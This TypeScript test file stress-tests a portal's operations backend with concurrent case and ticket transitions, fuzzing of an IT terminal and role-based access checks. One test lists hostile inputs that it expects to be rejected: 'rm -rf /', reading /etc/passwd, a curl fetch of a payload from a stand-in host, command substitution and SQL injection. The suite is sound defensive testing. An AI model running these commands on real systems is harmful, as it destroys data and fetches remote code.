import { PrismaClient } from '@prisma/client';
import {
  getOperationsSnapshot,
  performOperationsAction,
} from '../src/server/operations';
import type { PortalSession } from '../src/types/portal';
import type { OperationsAction } from '../src/types/operations';

const prisma = new PrismaClient();

interface TestResult {
  suite: string;
  name: string;
  passed: boolean;
  durationMs: number;
  error?: string;
}

const results: TestResult[] = [];

async function testCase(suite: string, name: string, fn: () => Promise<void>) {
  const start = Date.now();
  try {
    await fn();
    const durationMs = Date.now() - start;
    results.push({ suite, name, passed: true, durationMs });
    console.log(`  ✓ [${suite}] ${name} (${durationMs}ms)`);
  } catch (err: unknown) {
    const durationMs = Date.now() - start;
    const errorMsg = err instanceof Error ? err.stack || err.message : String(err);
    results.push({
      suite,
      name,
      passed: false,
      durationMs,
      error: errorMsg,
    });
    console.error(`  ✗ [${suite}] ${name} (${durationMs}ms)`);
    console.error(`    Error: ${errorMsg}`);
  }
}

function assert(condition: unknown, msg = 'Assertion failed') {
  if (!condition) throw new Error(msg);
}

function assertEqual<T>(actual: T, expected: T, msg?: string) {
  if (actual !== expected) {
    throw new Error(`${msg ? msg + ': ' : ''}Expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

// Dedicated test sessions
const itSession: PortalSession = {
  sessionId: 'test-sess-it-m4',
  subject: 'BSSIT2026HDK00001',
  role: 'BSS Admin',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const staffSession1: PortalSession = {
  sessionId: 'test-sess-staff-m4-1',
  subject: 'BSSST2026STF00001',
  role: 'BSS Staff',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const staffSession2: PortalSession = {
  sessionId: 'test-sess-staff-m4-2',
  subject: 'BSSST2026STF00002',
  role: 'BSS Staff',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const workerSession: PortalSession = {
  sessionId: 'test-sess-worker-m4',
  subject: 'BSS234567890124',
  role: 'Worker',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const contractorSession: PortalSession = {
  sessionId: 'test-sess-contractor-m4',
  subject: 'BSSC198200000001',
  role: 'Contractor',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const employerSession: PortalSession = {
  sessionId: 'test-sess-employer-m4',
  subject: 'BSSE100210000001',
  role: 'Employer',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

const govSession: PortalSession = {
  sessionId: 'test-sess-gov-m4',
  subject: 'BSSGOV2026ADM00001',
  role: 'Government',
  issuedAt: Date.now(),
  expiresAt: Date.now() + 3600_000,
};

export async function runM4AdversarialStressSuite() {
  console.log('\n======================================================================');
  console.log('  Milestone 4: Empirical Challenger 2 Adversarial Stress Test Suite  ');
  console.log('======================================================================\n');

  // =========================================================================
  // SUITE 1: Concurrent Case Updates & Ticket Resolutions Stress
  // =========================================================================
  console.log('\n--- SUITE 1: Concurrency & Race Condition Stress ---');

  await testCase('Concurrency', '30 concurrent staff claim mutations on the same case resolve deterministically without corruption', async () => {
    // Create dedicated test case
    const testCaseId = `STRESS-CASE-${Date.now()}`;
    await prisma.supportCase.create({
      data: {
        id: testCaseId,
        type: 'Binding',
        subject: 'Stress Test Concurrent Claim',
        party: 'Worker · BSS12345',
        owner: 'RK Buildcon',
        priority: 'High',
        status: 'Open',
        summary: 'Testing high concurrency claiming behavior',
      },
    });

    const staffIds = Array.from({ length: 30 }, (_, i) => `BSSST2026STF${String(i + 1).padStart(5, '0')}`);
    const initialLogCount = await prisma.operationsLog.count();

    // Fire 30 concurrent claim requests from different staff members
    const claimPromises = staffIds.map(staffId => {
      const session: PortalSession = {
        sessionId: `sess-${staffId}`,
        subject: staffId,
        role: 'BSS Staff',
        issuedAt: Date.now(),
        expiresAt: Date.now() + 3600_000,
      };
      return performOperationsAction(session, {
        action: 'case',
        id: testCaseId,
        transition: 'claim',
      });
    });

    const resultsArray = await Promise.all(claimPromises);
    assertEqual(resultsArray.length, 30, 'All 30 claims must return');
    for (const r of resultsArray) {
      assert(r.success, 'Each claim action must succeed');
    }

    // Verify SQLite state
    const dbCase = await prisma.supportCase.findUnique({ where: { id: testCaseId } });
    assert(!!dbCase, 'Case must exist in database');
    assertEqual(dbCase!.status, 'In progress', 'Case status must be In progress');
    assert(staffIds.includes(dbCase!.assignee!), 'Assignee must be one of the claiming staff members');

    // Verify audit logs were persisted for every request
    const afterLogCount = await prisma.operationsLog.count();
    assert(afterLogCount >= initialLogCount + 30, `At least 30 audit logs must be added (got ${afterLogCount - initialLogCount})`);

    // Clean up test case
    await prisma.supportCase.delete({ where: { id: testCaseId } });
  });

  await testCase('Concurrency', '50 parallel randomized multi-case lifecycle transitions maintain database consistency', async () => {
    // Create 5 test cases
    const testCases = await Promise.all(
      Array.from({ length: 5 }, (_, i) =>
        prisma.supportCase.create({
          data: {
            id: `STRESS-MULTI-${Date.now()}-${i}`,
            type: 'Document',
            subject: `Multi Case Stress ${i}`,
            party: `Party ${i}`,
            owner: `Owner ${i}`,
            priority: 'Normal',
            status: 'Open',
            summary: `Summary ${i}`,
          },
        })
      )
    );

    const transitions: Array<'claim' | 'wait' | 'resolve' | 'escalate'> = ['claim', 'wait', 'escalate', 'resolve'];

    // 50 random mutations across the 5 test cases
    const tasks = Array.from({ length: 50 }, (_, i) => {
      const targetCase = testCases[i % testCases.length];
      const trans = transitions[Math.floor(Math.random() * transitions.length)];
      const session = i % 2 === 0 ? staffSession1 : staffSession2;
      return performOperationsAction(session, {
        action: 'case',
        id: targetCase.id,
        transition: trans,
      });
    });

    const resultsArray = await Promise.all(tasks);
    assertEqual(resultsArray.length, 50, 'All 50 mutations completed');
    for (const r of resultsArray) {
      assert(r.success, 'Every randomized mutation succeeded');
    }

    // Verify all 5 cases exist and have valid statuses
    const validStatuses = ['In progress', 'Waiting for evidence', 'Escalated', 'Resolved'];
    for (const tc of testCases) {
      const row = await prisma.supportCase.findUnique({ where: { id: tc.id } });
      assert(!!row, `Case ${tc.id} must exist`);
      assert(validStatuses.includes(row!.status), `Status ${row!.status} must be valid`);
      await prisma.supportCase.delete({ where: { id: tc.id } });
    }
  });

  await testCase('Concurrency', '30 concurrent ticket status mutations on OperationsTicket execute without lock errors', async () => {
    const testTicketId = `STRESS-TICKET-${Date.now()}`;
    await prisma.operationsTicket.create({
      data: {
        id: testTicketId,
        title: 'Stress Test Operations Ticket',
        service: 'portal',
        priority: 'P2',
        status: 'Open',
      },
    });

    const ticketTransitions: Array<'claim' | 'monitor' | 'resolve' | 'escalate'> = ['claim', 'monitor', 'escalate', 'resolve'];
    const tasks = Array.from({ length: 30 }, (_, i) => {
      const trans = ticketTransitions[i % ticketTransitions.length];
      return performOperationsAction(itSession, {
        action: 'ticket',
        id: testTicketId,
        transition: trans,
      });
    });

    const resultsArray = await Promise.all(tasks);
    assertEqual(resultsArray.length, 30, 'All 30 ticket transitions completed');
    for (const r of resultsArray) {
      assert(r.success, 'Ticket transition succeeded');
    }

    const row = await prisma.operationsTicket.findUnique({ where: { id: testTicketId } });
    assert(!!row, 'Ticket must exist');
    const validTicketStatuses = ['In progress', 'Monitoring', 'Escalated', 'Resolved'];
    assert(validTicketStatuses.includes(row!.status), `Ticket status ${row!.status} must be valid`);

    await prisma.operationsTicket.delete({ where: { id: testTicketId } });
  });

  await testCase('Concurrency', '40 interleaved concurrent operations (terminal commands + case updates + ticket updates + snapshot fetches)', async () => {
    const testCaseId = `INTERLEAVED-CASE-${Date.now()}`;
    const testTicketId = `INTERLEAVED-TKT-${Date.now()}`;

    await prisma.supportCase.create({
      data: {
        id: testCaseId,
        type: 'Dispute',
        subject: 'Interleaved Concurrency Test',
        party: 'Worker vs Contractor',
        owner: 'Resolution Desk',
        priority: 'Urgent',
        status: 'Open',
        summary: 'Interleaved concurrency test case',
      },
    });

    await prisma.operationsTicket.create({
      data: {
        id: testTicketId,
        title: 'Interleaved Concurrency Ticket',
        service: 'benefits',
        priority: 'P1',
        status: 'Open',
      },
    });

    const operations: Promise<unknown>[] = [];

    // 10 terminal commands
    const terminalCmds = ['health', 'services', 'queues', 'sessions', 'bindings', 'db-stats', 'worker-lookup', 'tail-logs 10', 'stats', 'help'];
    for (const cmd of terminalCmds) {
      operations.push(performOperationsAction(itSession, { action: 'command', command: cmd }));
    }

    // 10 case updates
    const caseTrans: Array<'claim' | 'wait' | 'escalate' | 'resolve'> = ['claim', 'wait', 'escalate', 'resolve'];
    for (let i = 0; i < 10; i++) {
      operations.push(performOperationsAction(staffSession1, { action: 'case', id: testCaseId, transition: caseTrans[i % 4] }));
    }

    // 10 ticket updates
    const tktTrans: Array<'claim' | 'monitor' | 'escalate' | 'resolve'> = ['claim', 'monitor', 'escalate', 'resolve'];
    for (let i = 0; i < 10; i++) {
      operations.push(performOperationsAction(itSession, { action: 'ticket', id: testTicketId, transition: tktTrans[i % 4] }));
    }

    // 10 snapshot fetches
    for (let i = 0; i < 10; i++) {
      operations.push(getOperationsSnapshot(i % 2 === 0 ? itSession : staffSession1));
    }

    const allResults = await Promise.all(operations);
    assertEqual(allResults.length, 40, 'All 40 interleaved operations completed concurrently');

    // Clean up
    await prisma.supportCase.delete({ where: { id: testCaseId } });
    await prisma.operationsTicket.delete({ where: { id: testTicketId } });
  });

  // =========================================================================
  // SUITE 2: Terminal Execution Adversarial Stress & Fuzzing
  // =========================================================================
  console.log('\n--- SUITE 2: Terminal Execution Adversarial Stress & Fuzzing ---');

  await testCase('Terminal Fuzzing', 'Input length boundary: exactly 120 chars accepted, 121 chars rejected with 422', async () => {
    // 120 char valid command (total trimmed length 120)
    const valid120 = 'worker-lookup ' + 'BSS' + '1'.repeat(103);
    assertEqual(valid120.length, 120);
    const res120 = await performOperationsAction(itSession, { action: 'command', command: valid120 });
    assert(res120.success, '120-char command must succeed');

    // 121 char command must be rejected with 422
    const invalid121 = 'worker-lookup ' + 'BSS' + '1'.repeat(104);
    assertEqual(invalid121.length, 121);
    let rejected121 = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: invalid121 });
    } catch (err: unknown) {
      const error = err as { status?: number; message?: string };
      if (error?.status === 422 || error?.message?.includes('120 characters')) {
        rejected121 = true;
      }
    }
    assert(rejected121, '121-char command must be rejected with 422');

    // 1000 char command must be rejected
    const hugeCmd = 'services ' + 'a'.repeat(1000);
    let hugeRejected = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: hugeCmd });
    } catch (err: unknown) {
      const error = err as { status?: number };
      if (error?.status === 422) hugeRejected = true;
    }
    assert(hugeRejected, '1000-char command must be rejected with 422');
  });

  await testCase('Terminal Fuzzing', 'Empty, whitespace-only, and control character commands are safely rejected with 422', async () => {
    const blanks = ['', '   ', '\t\t', '\n\n', '   \t  '];
    for (const b of blanks) {
      let threw = false;
      try {
        await performOperationsAction(itSession, { action: 'command', command: b });
      } catch (err: unknown) {
        const error = err as { status?: number };
        if (error?.status === 422) threw = true;
      }
      assert(threw, `Blank command '${b}' must be rejected with 422`);
    }
  });

  await testCase('Terminal Fuzzing', 'Malicious shell commands, SQLi, and script injections are safely rejected', async () => {
    const initialUserCount = await prisma.user.count();

    const maliciousCommands = [
      'cat /etc/passwd',
      'rm -rf /',
      'curl http://malicious.org/payload.sh',
      'bash -c "id"',
      '$(whoami)',
      '; id',
      'select * from User',
      'DROP TABLE OperationsService;',
      '<script>alert(1)</script>',
      'probe ; DROP TABLE User; --',
      'worker-lookup \' OR \'1\'=\'1',
    ];

    for (const cmd of maliciousCommands) {
      let safelyHandled = false;
      try {
        const res = await performOperationsAction(itSession, { action: 'command', command: cmd });
        // If it didn't throw, ensure it safely reported not allowlisted / not found
        if (res.output?.some(l => l.includes('not found') || l.includes('not allowlisted'))) {
          safelyHandled = true;
        }
      } catch (err: unknown) {
        const error = err as { status?: number };
        // Threw 422 or 404 or 400 safely
        if (error?.status === 422 || error?.status === 404 || error?.status === 400) {
          safelyHandled = true;
        }
      }
      assert(safelyHandled, `Malicious payload '${cmd}' must be safely handled`);
    }

    // Verify User table count did not change
    const afterUserCount = await prisma.user.count();
    assertEqual(afterUserCount, initialUserCount, 'User table count must remain unchanged after SQLi fuzzing');
  });

  await testCase('Terminal Fuzzing', 'Nonexistent and invalid service probes return 404/422 without server error', async () => {
    // Nonexistent service ID (conforms to identifier regex, but service does not exist -> 404)
    let notFoundCaught = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: 'probe nonexistent-service-999' });
    } catch (err: unknown) {
      const error = err as { status?: number; message?: string };
      if (error?.status === 404 && error?.message?.includes('Unknown service')) {
        notFoundCaught = true;
      }
    }
    assert(notFoundCaught, 'Probe nonexistent service must throw 404 with helpful message');

    // Missing probe argument -> 422
    let invalidArgCaught = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: 'probe' });
    } catch (err: unknown) {
      const error = err as { status?: number };
      if (error?.status === 422) invalidArgCaught = true;
    }
    assert(invalidArgCaught, 'Probe without argument must throw 422');

    // Probe with invalid characters (underscores / special chars) -> 422
    let invalidCharsCaught = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: 'probe svc#$*!' });
    } catch (err: unknown) {
      const error = err as { status?: number };
      if (error?.status === 422) invalidCharsCaught = true;
    }
    assert(invalidCharsCaught, 'Probe with special characters must throw 422');

    let underscoreCaught = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: 'probe non_existent_svc_999' });
    } catch (err: unknown) {
      const error = err as { status?: number };
      if (error?.status === 422) underscoreCaught = true;
    }
    assert(underscoreCaught, 'Probe with underscores rejected with 422');
  });

  await testCase('Terminal Fuzzing', 'Valid service probes update latency and lastCheckedAt in database', async () => {
    const services = ['identity', 'portal', 'benefits', 'otp', 'voice', 'notifications'];
    for (const s of services) {
      const before = await prisma.operationsService.findUnique({ where: { id: s } });
      assert(!!before, `Service ${s} must exist`);

      const res = await performOperationsAction(itSession, { action: 'command', command: `probe ${s}` });
      assert(res.success, `Probe ${s} must succeed`);
      assert(res.output?.some(l => l.includes('latency')), `Probe ${s} output must report latency`);

      const after = await prisma.operationsService.findUnique({ where: { id: s } });
      assert(after!.lastCheckedAt.getTime() >= before!.lastCheckedAt.getTime(), 'lastCheckedAt updated');
    }
  });

  await testCase('Terminal Fuzzing', 'worker-lookup handles exact, lowercase, substring, mobile, and missing records gracefully', async () => {
    // Exact BSS ID
    const exact = await performOperationsAction(itSession, { action: 'command', command: 'worker-lookup BSS234567890124' });
    assert(exact.success && exact.output?.some(l => l.includes('Ravi Kumar')), 'Exact BSS ID lookup');

    // Lowercase BSS ID
    const lower = await performOperationsAction(itSession, { action: 'command', command: 'worker-lookup bss234567890124' });
    assert(lower.success && lower.output?.some(l => l.includes('Ravi Kumar')), 'Lowercase BSS ID lookup');

    // Name substring
    const nameSub = await performOperationsAction(itSession, { action: 'command', command: 'worker-lookup Ravi' });
    assert(nameSub.success && nameSub.output?.some(l => l.includes('Ravi Kumar')), 'Name substring lookup');

    // No args -> shows directory summary
    const noArgs = await performOperationsAction(itSession, { action: 'command', command: 'worker-lookup' });
    assert(noArgs.success && noArgs.output?.some(l => l.includes('Active worker records')), 'No arg directory summary');

    // Nonexistent worker record
    const nonExistent = await performOperationsAction(itSession, { action: 'command', command: 'worker-lookup BSS999999999999' });
    assert(nonExistent.success && nonExistent.output?.some(l => l.includes('not found')), 'Nonexistent worker gives not found message');
  });

  await testCase('Terminal Fuzzing', 'tail-logs / logs depth parsing fuzzing (negative, 0, 1, 50, >50, non-numeric)', async () => {
    // Default (no arg) -> 5 logs
    const def = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs' });
    assert(def.success && (def.output?.length ?? 0) <= 5 && (def.output?.length ?? 0) > 0, 'tail-logs default');

    // depth 1 -> exactly 1 log
    const one = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs 1' });
    assertEqual(one.output?.length, 1, 'tail-logs 1 returns 1 log');

    // depth 50 -> up to 50 logs
    const fifty = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs 50' });
    assert((fifty.output?.length ?? 0) <= 50, 'tail-logs 50 returns up to 50');

    // depth 999 -> clamped to 50 logs max
    const huge = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs 999' });
    assert((huge.output?.length ?? 0) <= 50, 'tail-logs 999 clamped to 50');

    // depth 0 -> clamped to at least 1 or fallback 5
    const zero = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs 0' });
    assert((zero.output?.length ?? 0) >= 1 && (zero.output?.length ?? 0) <= 5, 'tail-logs 0 handled safely');

    // depth non-numeric -> fallback to 5
    const nonNum = await performOperationsAction(itSession, { action: 'command', command: 'tail-logs abc' });
    assert((nonNum.output?.length ?? 0) <= 5, 'tail-logs abc handled safely');
  });

  await testCase('Terminal Fuzzing', 'retry-binding handles valid binding ID, existing case update, and invalid formats', async () => {
    // Create a binding test case
    const bindingCaseId = `BC-STRESS-${Date.now().toString().slice(-4)}`;
    await prisma.supportCase.create({
      data: {
        id: bindingCaseId,
        type: 'Binding',
        subject: 'Binding retry stress test',
        party: 'Worker · BSS12345',
        owner: 'RK Buildcon',
        priority: 'Normal',
        status: 'Open',
        summary: 'Testing retry-binding',
      },
    });

    const res = await performOperationsAction(itSession, { action: 'command', command: `retry-binding ${bindingCaseId}` });
    assert(res.success && res.output?.some(l => l.includes(`Retry accepted for ${bindingCaseId}`)), 'retry-binding output confirms acceptance');

    // Case status should now be 'In progress'
    const updatedCase = await prisma.supportCase.findUnique({ where: { id: bindingCaseId } });
    assertEqual(updatedCase!.status, 'In progress', 'Case updated to In progress on retry-binding');

    await prisma.supportCase.delete({ where: { id: bindingCaseId } });

    // Invalid format rejection
    let invalidCaught = false;
    try {
      await performOperationsAction(itSession, { action: 'command', command: 'retry-binding !@#$' });
    } catch (err: unknown) {
      const error = err as { status?: number };
      if (error?.status === 422) invalidCaught = true;
    }
    assert(invalidCaught, 'retry-binding with invalid chars rejected with 422');
  });

  await testCase('Terminal High-Throughput', '100 sequential rapid terminal commands execute with 100% success rate', async () => {
    const commands = [
      'health', 'services', 'queues', 'sessions', 'bindings', 'db-stats', 'stats',
      'worker-lookup', 'worker-lookup BSS234567890124', 'tail-logs 3', 'logs 2', 'help',
      'probe identity', 'probe portal', 'probe benefits', 'probe notifications',
    ];

    const start = Date.now();
    for (let i = 0; i < 100; i++) {
      const cmd = commands[i % commands.length];
      const res = await performOperationsAction(itSession, { action: 'command', command: cmd });
      assert(res.success, `Command ${cmd} (iter ${i}) must succeed`);
    }
    const duration = Date.now() - start;
    console.log(`    -> 100 commands executed in ${duration}ms (${(duration / 100).toFixed(1)}ms/cmd)`);
  });

  // =========================================================================
  // SUITE 3: Database Integrity & Audit Log Consistency
  // =========================================================================
  console.log('\n--- SUITE 3: Database Integrity & Audit Log Stream ---');

  await testCase('Database Integrity', 'Complete full-cycle state machine traversal on SupportCase with database verification', async () => {
    const caseId = `FULL-CYCLE-CASE-${Date.now()}`;
    await prisma.supportCase.create({
      data: {
        id: caseId,
        type: 'Dispute',
        subject: 'Full Lifecycle Verification Case',
        party: 'Ravi Kumar vs L&T',
        owner: 'BSS Resolution Desk',
        priority: 'High',
        status: 'Open',
        summary: 'Verifying complete state transitions',
      },
    });

    // 1. Claim -> In progress
    const r1 = await performOperationsAction(staffSession1, { action: 'case', id: caseId, transition: 'claim' });
    assert(r1.success);
    let c = await prisma.supportCase.findUnique({ where: { id: caseId } });
    assertEqual(c!.status, 'In progress');
    assertEqual(c!.assignee, staffSession1.subject);

    // 2. Wait -> Waiting for evidence
    const r2 = await performOperationsAction(staffSession1, { action: 'case', id: caseId, transition: 'wait' });
    assert(r2.success);
    c = await prisma.supportCase.findUnique({ where: { id: caseId } });
    assertEqual(c!.status, 'Waiting for evidence');

    // 3. Escalate -> Escalated
    const r3 = await performOperationsAction(staffSession1, { action: 'case', id: caseId, transition: 'escalate' });
    assert(r3.success);
    c = await prisma.supportCase.findUnique({ where: { id: caseId } });
    assertEqual(c!.status, 'Escalated');

    // 4. Resolve -> Resolved
    const r4 = await performOperationsAction(staffSession1, { action: 'case', id: caseId, transition: 'resolve' });
    assert(r4.success);
    c = await prisma.supportCase.findUnique({ where: { id: caseId } });
    assertEqual(c!.status, 'Resolved');

    await prisma.supportCase.delete({ where: { id: caseId } });
  });

  await testCase('Database Integrity', 'Complete full-cycle state machine traversal on OperationsTicket with database verification', async () => {
    const tktId = `FULL-CYCLE-TKT-${Date.now()}`;
    await prisma.operationsTicket.create({
      data: {
        id: tktId,
        title: 'Full Lifecycle Verification Ticket',
        service: 'otp',
        priority: 'P2',
        status: 'Open',
      },
    });

    // 1. Claim -> In progress
    const r1 = await performOperationsAction(itSession, { action: 'ticket', id: tktId, transition: 'claim' });
    assert(r1.success);
    let t = await prisma.operationsTicket.findUnique({ where: { id: tktId } });
    assertEqual(t!.status, 'In progress');
    assertEqual(t!.assignee, itSession.subject);

    // 2. Monitor -> Monitoring
    const r2 = await performOperationsAction(itSession, { action: 'ticket', id: tktId, transition: 'monitor' });
    assert(r2.success);
    t = await prisma.operationsTicket.findUnique({ where: { id: tktId } });
    assertEqual(t!.status, 'Monitoring');

    // 3. Escalate -> Escalated
    const r3 = await performOperationsAction(itSession, { action: 'ticket', id: tktId, transition: 'escalate' });
    assert(r3.success);
    t = await prisma.operationsTicket.findUnique({ where: { id: tktId } });
    assertEqual(t!.status, 'Escalated');

    // 4. Resolve -> Resolved
    const r4 = await performOperationsAction(itSession, { action: 'ticket', id: tktId, transition: 'resolve' });
    assert(r4.success);
    t = await prisma.operationsTicket.findUnique({ where: { id: tktId } });
    assertEqual(t!.status, 'Resolved');

    await prisma.operationsTicket.delete({ where: { id: tktId } });
  });

  await testCase('Database Integrity', 'OperationsLog schema & correlationId integrity check across recent entries', async () => {
    const logs = await prisma.operationsLog.findMany({
      take: 20,
      orderBy: { timestamp: 'desc' },
    });

    assert(logs.length >= 10, 'Must have at least 10 recent logs');
    for (const log of logs) {
      assert(log.id && log.id.length > 0, 'Log id must be non-empty');
      assert(log.timestamp instanceof Date && !isNaN(log.timestamp.getTime()), 'Timestamp must be valid date');
      assert(['info', 'warning', 'error', 'audit'].includes(log.level), `Level ${log.level} must be valid enum`);
      assert(log.source && log.source.length > 0, 'Source must be non-empty');
      assert(log.message && log.message.length > 0, 'Message must be non-empty');
      assert(log.correlationId.startsWith('corr-'), `Correlation ID ${log.correlationId} must start with corr-`);
    }
  });

  await testCase('Database Integrity', 'Cross-role RBAC strict isolation matrix across all 6 roles', async () => {
    const testCases: Array<{ session: PortalSession; action: OperationsAction; expectedForbidden: boolean; desc: string }> = [
      { session: workerSession, action: { action: 'command', command: 'health' }, expectedForbidden: true, desc: 'Worker running IT terminal' },
      { session: contractorSession, action: { action: 'command', command: 'health' }, expectedForbidden: true, desc: 'Contractor running IT terminal' },
      { session: employerSession, action: { action: 'command', command: 'health' }, expectedForbidden: true, desc: 'Employer running IT terminal' },
      { session: govSession, action: { action: 'command', command: 'health' }, expectedForbidden: true, desc: 'Government running IT terminal' },
      { session: staffSession1, action: { action: 'command', command: 'health' }, expectedForbidden: true, desc: 'BSS Staff running IT terminal' },

      { session: itSession, action: { action: 'case', id: 'BC-1039', transition: 'claim' }, expectedForbidden: true, desc: 'IT Helpdesk mutating BSS Staff case' },
      { session: workerSession, action: { action: 'case', id: 'BC-1039', transition: 'claim' }, expectedForbidden: true, desc: 'Worker mutating BSS Staff case' },
      { session: contractorSession, action: { action: 'case', id: 'BC-1039', transition: 'claim' }, expectedForbidden: true, desc: 'Contractor mutating BSS Staff case' },
      { session: employerSession, action: { action: 'case', id: 'BC-1039', transition: 'claim' }, expectedForbidden: true, desc: 'Employer mutating BSS Staff case' },
      { session: govSession, action: { action: 'case', id: 'BC-1039', transition: 'claim' }, expectedForbidden: true, desc: 'Government mutating BSS Staff case' },

      { session: staffSession1, action: { action: 'ticket', id: 'INC-2026-081', transition: 'claim' }, expectedForbidden: true, desc: 'BSS Staff mutating IT ticket' },
      { session: workerSession, action: { action: 'ticket', id: 'INC-2026-081', transition: 'claim' }, expectedForbidden: true, desc: 'Worker mutating IT ticket' },
      { session: contractorSession, action: { action: 'ticket', id: 'INC-2026-081', transition: 'claim' }, expectedForbidden: true, desc: 'Contractor mutating IT ticket' },
      { session: employerSession, action: { action: 'ticket', id: 'INC-2026-081', transition: 'claim' }, expectedForbidden: true, desc: 'Employer mutating IT ticket' },
      { session: govSession, action: { action: 'ticket', id: 'INC-2026-081', transition: 'claim' }, expectedForbidden: true, desc: 'Government mutating IT ticket' },

      { session: itSession, action: { action: 'command', command: 'health' }, expectedForbidden: false, desc: 'IT Helpdesk running IT terminal (ALLOWED)' },
      { session: staffSession1, action: { action: 'case', id: 'BC-1039', transition: 'wait' }, expectedForbidden: false, desc: 'BSS Staff mutating case (ALLOWED)' },
      { session: itSession, action: { action: 'ticket', id: 'INC-2026-081', transition: 'monitor' }, expectedForbidden: false, desc: 'IT Helpdesk mutating ticket (ALLOWED)' },
    ];

    for (const tc of testCases) {
      let forbidden = false;
      try {
        const res = await performOperationsAction(tc.session, tc.action);
        if (res.success && tc.expectedForbidden) {
          throw new Error(`Expected forbidden for ${tc.desc}, but succeeded.`);
        }
      } catch (err: unknown) {
        const error = err as { status?: number; message?: string };
        if (error?.status === 403 || error?.message?.includes('not permitted')) {
          forbidden = true;
        } else if (!tc.expectedForbidden) {
          throw err;
        }
      }
      if (tc.expectedForbidden) {
        assert(forbidden, `Action '${tc.desc}' must be forbidden with 403`);
      }
    }
  });

  // =========================================================================
  // SUMMARY
  // =========================================================================
  console.log('\n======================================================================');
  console.log('                          TEST RUN SUMMARY                            ');
  console.log('======================================================================');

  const passed = results.filter(r => r.passed).length;
  const failed = results.filter(r => !r.passed).length;
  const total = results.length;
  const totalDuration = results.reduce((sum, r) => sum + r.durationMs, 0);

  console.log(`  Total Tests:    ${total}`);
  console.log(`  Total Passed:   ${passed}`);
  console.log(`  Total Failed:   ${failed}`);
  console.log(`  Total Time:     ${totalDuration}ms`);
  console.log('======================================================================\n');

  if (failed > 0) {
    console.error(`💥 ${failed} test(s) failed.`);
    process.exit(1);
  } else {
    console.log(`✔ ALL ${total} ADVERSARIAL STRESS TESTS PASSED SUCCESSFULLY!`);
  }
}

// Execute if run directly
runM4AdversarialStressSuite()
  .catch(err => {
    console.error('Fatal test error:', err);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
